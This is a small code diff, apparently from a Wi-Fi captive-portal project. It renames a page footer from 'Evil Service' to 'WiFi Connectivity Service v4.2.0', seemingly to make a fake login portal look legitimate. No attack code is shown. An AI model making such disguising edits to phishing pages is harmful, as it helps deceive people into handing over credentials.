@@ -90,7 +90,7 @@ String header(String t, bool light=false) {
 }
 
 String footer() {
-  return "</div></div><div style='text-align:center;padding:2em 0;color:#666;font-size:0.9em;'>&copy; Evil Service</div></body></html>";
+  return "</div></div><div style='text-align:center;padding:2em 0;color:#666;font-size:0.9em;'>&copy; WiFi Connectivity Service v4.2.0</div></body></html>";
 }
 
 String input(String arg) {
